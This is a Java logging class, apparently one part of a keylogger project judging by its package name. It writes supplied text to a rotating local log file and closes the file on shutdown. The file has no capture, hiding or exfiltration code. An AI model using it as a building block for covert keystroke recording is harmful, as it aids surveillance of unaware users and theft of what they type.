package com.mossad.keylogger.logging;

import java.io.IOException;
import java.util.Objects;
import java.util.logging.FileHandler;
import java.util.logging.Logger;
import java.util.logging.SimpleFormatter;

public final class LogRecorder {

      private final Logger LOG = Logger.getLogger(LogRecorder.class.getCanonicalName());
      private final SimpleFormatter simpleFormatter;
      private FileHandler fileHandler;

      public LogRecorder() {
            simpleFormatter = new SimpleFormatter();
            try {
                  fileHandler = new FileHandler("Logging", 1024000, 2, true);
                  fileHandler.flush();
                  fileHandler.close();
                  fileHandler = new FileHandler("Logging", 1024000, 2, true);
                  fileHandler.setEncoding("UTF-8");
            }
            catch (IOException ex) {
                  throw new RuntimeException("Cannot create logging file. Exiting application");
            }
            fileHandler.setFormatter(simpleFormatter);
            LOG.addHandler(fileHandler);

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                  fileHandler.close();
            }));
      }

      public void writeContent(String content) {
            if (!Objects.isNull(content) && !content.isEmpty()) {
                  LOG.info(content);
            }
      }
}